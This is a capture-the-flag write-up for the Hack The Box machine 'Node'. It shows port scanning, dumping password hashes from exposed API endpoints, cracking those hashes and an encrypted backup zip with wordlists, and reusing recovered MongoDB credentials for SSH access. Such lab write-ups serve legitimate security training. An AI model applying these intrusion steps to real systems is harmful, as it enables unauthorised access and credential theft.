# Node
**Machine ip:** 10.10.10.58

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.58 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.58`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/76b5cb96-bdc1-4d88-9b42-e1a2911dab3b)

+ The result shows that 2 ports are open:
```
Port 22: OpenSSH 7.2p2
Port 3000: Apache Hadoop
```

+ Navigate to `http://10.10.10.58:3000/` and always start off with enumerating web server first.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f238baa-49a8-491c-820e-5d22c6b7d4fb)

+ View page source to see whether there is any useful information.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ae96894c-7dd7-4f67-97d9-32fb22b1b2e1)

+ **Firstly**, check `http://10.10.10.58:3000/assets/js/app/controllers/home.js`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd4d850e-e804-4e59-9fa7-d63cc9d54e20)

+ Navigate to `http://10.10.10.58:3000/api/users/latest`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/029deb19-0572-4137-9767-6d06a2fb5ade)

+ Discovered usernames and password hashes:
```
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

+ **Secondly**, visit `http://10.10.10.58:3000/assets/js/app/controllers/profile.js` and view `http://10.10.10.58:3000/api/users/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/57a93960-4a6b-4dc7-ba1c-7cef751d95ec)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0145c645-9e8e-4429-a84a-424331ffa8d6)

+ Discovered usernames and password hashes:
```
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

+ **Thirdly**, visit `http://10.10.10.58:3000/assets/js/app/controllers/admin.js` and view `http://10.10.10.58:3000/api/admin/backup`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c8e7da5f-7896-451a-a194-b91ba8a5259c)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2ba5edbb-68a2-4580-bab6-118347ae369a)

+ Discovered usernames and password hashes:
```
tom:f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
mark:de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
rastating:5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
myP14ceAdm1nAcc0uNT:dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
```

+ Crack hashes using [crackstation.net](https://crackstation.net):
```
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/68b9f099-e845-4795-a618-6e8cefbc2cd2)

+ Cracked passwords and users:
```
tom:spongebob
mark:snowflake
myP14ceAdm1nAcc0uNT:manchester
```

+ Visit `http://10.10.10.58:3000/login` and login with the admin's account `myP14ceAdm1nAcc0uNT`:`manchester`
+ Download Backup file.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d89bea42-0470-4e1f-8e12-35246d747736)

+ File type: `file myplace.backup`
+ View only the last 100 bytes of data from **myplace.backup**: `tail -c 100 myplace.backup`
+ It is base64 encoding.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/06207dcb-8b7a-4d85-a3fe-c857022a6c4e)

+ Decode it: `base64 -d myplace.backup > decoded.file`
+ File type: `file decoded.file`
+ Extract zip file: `unzip decoded.file`
+ It requires a password.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/09a27b2a-3c5b-4c57-9f8d-eb142218df6a)

+ Crack it using **fcrackzip**: `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded.file`
+ **Alternatively**, try **zip2john** with **john** to crack it.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded.file

PASSWORD FOUND!!!!: pw == magicword

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff73b8cb-fc1c-4f88-8ea4-cdf00c831664)

+ Unzip the file with the password: `unzip -P magicword decoded.file`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c709399b-ccce-47c1-ab28-cbd87c169155)

+ Discovered **mongodb** credentials in the **app.js** file:
```
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3ad6fec3-13ff-4dbd-bd8d-29f5c298cbd3)

+ Login ssh with the discovered credentials `mark`:`5AYRft73VtFpc84k`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/58a4685a-5d78-402a-9748-0dc47e611ecd)

+ Mark doesn't have read permission to read user.txt.

+ Escalate the privileges to Tom's privilege.
+ Check processes: `ps aux | grep -i tom`
```
mark@node:~$ ps aux | grep -i tom
tom       1233  0.0  5.9 1074104 45424 ?       Ssl  08:02   0:03 /usr/bin/node /var/scheduler/app.js
tom       1237  0.0  7.4 1029352 56552 ?       Ssl  08:02   0:04 /usr/bin/node /var/www/myplace/app.js
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8cff493d-1519-47ae-b447-d079edd5b2f6)

+ Focus on **/var/scheduler/app.js** process, and it's being run every 30 seconds by tom. This script will connect to the Mongo database, and then run a series of commands every 30 seconds.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f5c0ab3e-fb47-469d-84a4-ce2c6f5bebaf)




# References & Alternatives:
+ https://0xdf.gitlab.io/2021/06/08/htb-node.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/node-writeup-w-o-metasploit
